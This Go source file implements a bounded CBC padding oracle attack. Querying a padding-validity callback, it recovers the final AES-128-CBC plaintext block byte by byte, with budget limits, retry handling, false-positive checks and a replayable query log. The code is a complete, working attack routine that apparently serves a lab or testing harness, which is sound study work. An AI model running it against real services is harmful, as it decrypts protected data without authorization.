package netsec

import (
	"errors"
	"fmt"
)

const (
	// DefaultInfrastructureRetries is the number of additional attempts made
	// for one logical query after an InfrastructureError.
	DefaultInfrastructureRetries = 1

	// MaxInfrastructureRetries prevents a callback that always reports
	// InfrastructureError from causing unbounded retries.
	MaxInfrastructureRetries = 5
)

var (
	// ErrBudgetExhausted means the next callback call would exceed the caller's
	// query budget. No call is made beyond the budget.
	ErrBudgetExhausted = errors.New("query budget exhausted")

	// ErrInfrastructureFailure means a logical query still failed after the
	// configured bounded retries. It is never interpreted as PaddingInvalid.
	ErrInfrastructureFailure = errors.New("persistent infrastructure failure")

	// ErrOracleNotEstablished means the callback did not expose a usable
	// padding distinction, or its answers were internally inconsistent. The
	// experiment therefore refuses to report a recovered plaintext.
	ErrOracleNotEstablished = errors.New("padding oracle could not be established")
)

// AttackConfig controls a bounded recovery run.
type AttackConfig struct {
	// Budget is the maximum number of callback invocations, including
	// retries. A non-negative value is required.
	Budget int

	// InfrastructureRetries is the number of additional attempts for a
	// logical query that returned InfrastructureError. The default entry
	// point RecoverLastBlock uses DefaultInfrastructureRetries.
	InfrastructureRetries int
}

// StopReason explains why a recovery run ended.
type StopReason string

const (
	StopComplete              StopReason = "complete"
	StopBudgetExhausted       StopReason = "budget-exhausted"
	StopInfrastructureFailure StopReason = "infrastructure-failure"
	StopOracleNotEstablished  StopReason = "oracle-not-established"
	StopInvalidInput          StopReason = "invalid-input"
)

// Query is one immutable callback invocation recorded for replay. IV and
// Ciphertext are defensive copies of exactly the bytes supplied to the
// callback.
type Query struct {
	Index      int
	Attempt    int
	Stage      string
	IV         []byte
	Ciphertext []byte
	Feedback   Feedback
}

// BlockMask marks bytes that were not recovered. True means unknown.
type BlockMask [BlockSize]bool

// UnknownCount returns the number of bytes still marked unknown.
func (m BlockMask) UnknownCount() int {
	count := 0
	for _, unknown := range m {
		if unknown {
			count++
		}
	}
	return count
}

// Result contains the bounded experiment's observations. Intermediate and
// PlaintextLastBlock are populated only when their bytes are known; unknown
// positions are marked in UnknownMask. PlaintextLastBlock is deliberately
// nil whenever the run did not complete.
type Result struct {
	Intermediate       []byte
	PlaintextLastBlock []byte
	UnknownMask        BlockMask
	QueryLog           []Query
	QueriesUsed        int
	Complete           bool
	OracleEstablished  bool
	StopReason         StopReason
}

// RecoverLastBlock attempts to recover the final 16-byte plaintext block of an
// AES-128-CBC ciphertext through padding feedback alone.
//
// iv is the original 16-byte IV and ciphertext is the original body (one or
// more 16-byte blocks). The callback is the only source of information about
// the target key; the key itself is never passed to this function.
//
// The final byte is scanned across all 256 candidates. Every candidate that
// yields valid padding is re-probed twice with a changed preceding byte. This
// removes the false positive produced when the original plaintext legitimately
// ends in 02 02, a full 0x10 padding block, or another multi-byte padding.
// Recovery never accepts the first valid answer. Remaining bytes are recovered
// from right to left with the already-known suffix fixed to the required
// padding length.
func RecoverLastBlock(callback DecryptCallback, iv, ciphertext []byte, budget int) (Result, error) {
	return RecoverLastBlockWithConfig(callback, iv, ciphertext, AttackConfig{
		Budget:                budget,
		InfrastructureRetries: DefaultInfrastructureRetries,
	})
}

// RecoverLastBlockFromEnvelope is the IV||ciphertext convenience form of
// RecoverLastBlock.
func RecoverLastBlockFromEnvelope(callback DecryptCallback, envelope []byte, budget int) (Result, error) {
	if len(envelope) < 2*BlockSize {
		var allUnknown BlockMask
		for i := range allUnknown {
			allUnknown[i] = true
		}
		result := emptyResult(allUnknown)
		result.StopReason = StopInvalidInput
		return result, fmt.Errorf("%w: envelope must contain an IV and at least one block", ErrInvalidInput)
	}
	return RecoverLastBlock(callback, envelope[:BlockSize], envelope[BlockSize:], budget)
}

// RecoverLastBlockWithConfig is RecoverLastBlock with explicit retry policy.
func RecoverLastBlockWithConfig(callback DecryptCallback, iv, ciphertext []byte, config AttackConfig) (Result, error) {
	var allUnknown BlockMask
	for i := range allUnknown {
		allUnknown[i] = true
	}

	if callback == nil ||
		config.Budget < 0 ||
		config.InfrastructureRetries < 0 ||
		config.InfrastructureRetries > MaxInfrastructureRetries {
		return emptyResult(allUnknown), fmt.Errorf("%w: nil callback, negative budget, or invalid retry count", ErrInvalidInput)
	}
	if err := validateCBCInput(iv, ciphertext); err != nil {
		if config.Budget == 0 {
			result := emptyResult(allUnknown)
			result.StopReason = StopInvalidInput
			return result, err
		}
		result := emptyResult(allUnknown)
		result.StopReason = StopInvalidInput
		return result, fmt.Errorf("%w: %v", ErrInvalidInput, err)
	}

	originalIV := cloneBytes(iv)
	originalCiphertext := cloneBytes(ciphertext)
	workingIV := cloneBytes(originalIV)
	workingCiphertext := cloneBytes(originalCiphertext)

	var originalPreviousBlock []byte
	if len(originalCiphertext) == BlockSize {
		originalPreviousBlock = originalIV
	} else {
		originalPreviousBlock = originalCiphertext[len(originalCiphertext)-2*BlockSize : len(originalCiphertext)-BlockSize]
	}

	var mutablePreviousBlock []byte
	if len(workingCiphertext) == BlockSize {
		mutablePreviousBlock = workingIV
	} else {
		mutablePreviousBlock = workingCiphertext[len(workingCiphertext)-2*BlockSize : len(workingCiphertext)-BlockSize]
	}

	state := recoveryState{
		callback:              callback,
		budget:                config.Budget,
		infrastructureRetries: config.InfrastructureRetries,
		workingIV:             workingIV,
		workingCiphertext:     workingCiphertext,
		mutablePreviousBlock:  mutablePreviousBlock,
		originalPreviousBlock: originalPreviousBlock,
		queryLog:              make([]Query, 0, 258),
	}

	var known [BlockSize]byte
	var unknown BlockMask
	for i := range unknown {
		unknown[i] = true
	}

	if config.Budget == 0 {
		result := state.makeResult(known, unknown, false, false, StopBudgetExhausted)
		return result, ErrBudgetExhausted
	}

	established, err := state.solve(&known, &unknown)
	if err != nil {
		stop := StopReasonForError(err)
		result := state.makeResult(known, unknown, false, established, stop)
		return result, err
	}

	result := state.makeResult(known, unknown, true, true, StopComplete)
	return result, nil
}

// ReplayQueries reissues each logged request in order and verifies that the
// callback reproduces the recorded feedback. The callback remains the sole
// source of truth; replay neither needs nor receives the target key.
func ReplayQueries(log []Query, callback DecryptCallback) error {
	if callback == nil {
		return fmt.Errorf("%w: nil callback", ErrInvalidInput)
	}

	for i := range log {
		query := &log[i]
		got := callback(cloneBytes(query.IV), cloneBytes(query.Ciphertext))
		if got != query.Feedback {
			return &ReplayMismatchError{
				Index: i,
				Want:  query.Feedback,
				Got:   got,
			}
		}
	}
	return nil
}

// Replay is a short alias for ReplayQueries.
func Replay(log []Query, callback DecryptCallback) error {
	return ReplayQueries(log, callback)
}

// ReplayMismatchError reports a non-reproducible query result.
type ReplayMismatchError struct {
	Index int
	Want  Feedback
	Got   Feedback
}

func (e *ReplayMismatchError) Error() string {
	return fmt.Sprintf("query %d replay mismatch: recorded %s, got %s", e.Index, e.Want, e.Got)
}

// StopReasonForError maps a recovery error to the corresponding stop reason.
func StopReasonForError(err error) StopReason {
	switch {
	case errors.Is(err, ErrBudgetExhausted):
		return StopBudgetExhausted
	case errors.Is(err, ErrInfrastructureFailure):
		return StopInfrastructureFailure
	case errors.Is(err, ErrOracleNotEstablished):
		return StopOracleNotEstablished
	default:
		return StopInvalidInput
	}
}

type recoveryState struct {
	callback              DecryptCallback
	budget                int
	infrastructureRetries int
	queryLog              []Query
	used                  int

	workingIV             []byte
	workingCiphertext     []byte
	mutablePreviousBlock  []byte
	originalPreviousBlock []byte
}

func (r *recoveryState) solve(known *[BlockSize]byte, unknown *BlockMask) (bool, error) {
	established := false

	for position := BlockSize - 1; position >= 0; position-- {
		paddingLength := byte(BlockSize - position)

		if position < BlockSize-1 {
			for suffix := position + 1; suffix < BlockSize; suffix++ {
				r.mutablePreviousBlock[suffix] = known[suffix] ^ paddingLength
			}
		}

		candidates := make([]byte, 0, 2)
		sawRejected := false
		for guess := 0; guess < 256; guess++ {
			r.mutablePreviousBlock[position] = byte(guess)
			feedback, err := r.ask(stageName(position))
			if err != nil {
				return established, err
			}

			switch feedback {
			case PaddingValid:
				candidate := byte(guess) ^ paddingLength
				if !containsByte(candidates, candidate) {
					candidates = append(candidates, candidate)
				}
			case PaddingInvalid:
				// A non-valid answer is expected for almost every guess.
			case Rejected:
				sawRejected = true
			default:
				// ask treats unknown feedback as infrastructure failure, so
				// this branch is defensive only.
				sawRejected = true
			}
		}

		// Every callback answer was scanned before any candidate is accepted.
		// A uniform rejection means no padding distinction was observable.
		if sawRejected {
			return established, ErrOracleNotEstablished
		}
		if len(candidates) == 0 {
			return established, ErrOracleNotEstablished
		}

		if position == BlockSize-1 {
			confirmed, err := r.confirmLastByteCandidates(candidates)
			if err != nil {
				return established, err
			}
			if len(confirmed) != 1 {
				return established, ErrOracleNotEstablished
			}
			known[position] = confirmed[0]
		} else {
			// With the known suffix fixed to the required padding, exactly one
			// guess can have valid padding. Multiple answers indicate that the
			// feedback is not a clean padding oracle.
			if len(candidates) != 1 {
				return established, ErrOracleNotEstablished
			}
			known[position] = candidates[0]
		}

		unknown[position] = false
		established = true
	}

	return true, nil
}

func (r *recoveryState) confirmLastByteCandidates(candidates []byte) ([]byte, error) {
	confirmed := make([]byte, 0, 1)
	probes := [2]byte{0x00, 0xff}

	for _, candidate := range candidates {
		r.mutablePreviousBlock[BlockSize-1] = candidate ^ 1

		passed := true
		for _, probe := range probes {
			r.mutablePreviousBlock[BlockSize-2] = probe
			feedback, err := r.ask("confirm-last-byte")
			if err != nil {
				return nil, err
			}
			switch feedback {
			case PaddingValid:
				// A genuine one-byte-padding candidate remains valid even when
				// the preceding byte changes.
			case Rejected:
				return nil, ErrOracleNotEstablished
			default:
				passed = false
			}
			if !passed {
				break
			}
		}
		if passed {
			confirmed = append(confirmed, candidate)
		}
	}

	return confirmed, nil
}

func (r *recoveryState) ask(stage string) (Feedback, error) {
	maxAttempts := 1 + r.infrastructureRetries

	for attempt := 1; attempt <= maxAttempts; attempt++ {
		if r.used >= r.budget {
			return 0, ErrBudgetExhausted
		}

		queryIV := cloneBytes(r.workingIV)
		queryCiphertext := cloneBytes(r.workingCiphertext)
		logIV := cloneBytes(queryIV)
		logCiphertext := cloneBytes(queryCiphertext)

		r.used++
		feedback := r.callback(queryIV, queryCiphertext)
		r.queryLog = append(r.queryLog, Query{
			Index:      r.used,
			Attempt:    attempt,
			Stage:      stage,
			IV:         logIV,
			Ciphertext: logCiphertext,
			Feedback:   feedback,
		})

		switch feedback {
		case PaddingValid, PaddingInvalid, Rejected:
			return feedback, nil
		default:
			// InfrastructureError and any protocol-invalid value are retried only
			// within the hard bound and are never converted to PaddingInvalid.
			if attempt == maxAttempts {
				return 0, ErrInfrastructureFailure
			}
		}
	}

	panic("unreachable: bounded retry loop exited")
}

func (r *recoveryState) makeResult(known [BlockSize]byte, unknown BlockMask, complete, established bool, stop StopReason) Result {
	result := emptyResult(unknown)
	copy(result.Intermediate, known[:])
	result.QueryLog = cloneQueries(r.queryLog)
	result.QueriesUsed = r.used
	result.Complete = complete
	result.OracleEstablished = established
	result.StopReason = stop

	if complete {
		result.PlaintextLastBlock = make([]byte, BlockSize)
		for i := 0; i < BlockSize; i++ {
			result.PlaintextLastBlock[i] = known[i] ^ r.originalPreviousBlock[i]
		}
	}
	return result
}

func emptyResult(mask BlockMask) Result {
	return Result{
		Intermediate: make([]byte, BlockSize),
		UnknownMask:  mask,
		QueryLog:     make([]Query, 0),
	}
}

func stageName(position int) string {
	if position == BlockSize-1 {
		return "scan-last-byte"
	}
	return fmt.Sprintf("scan-byte-%d", position)
}

func containsByte(values []byte, target byte) bool {
	for _, value := range values {
		if value == target {
			return true
		}
	}
	return false
}

func cloneBytes(value []byte) []byte {
	if value == nil {
		return nil
	}
	cloned := make([]byte, len(value))
	copy(cloned, value)
	return cloned
}

func cloneQueries(log []Query) []Query {
	cloned := make([]Query, len(log))
	for i, query := range log {
		cloned[i] = query
		cloned[i].IV = cloneBytes(query.IV)
		cloned[i].Ciphertext = cloneBytes(query.Ciphertext)
	}
	return cloned
}
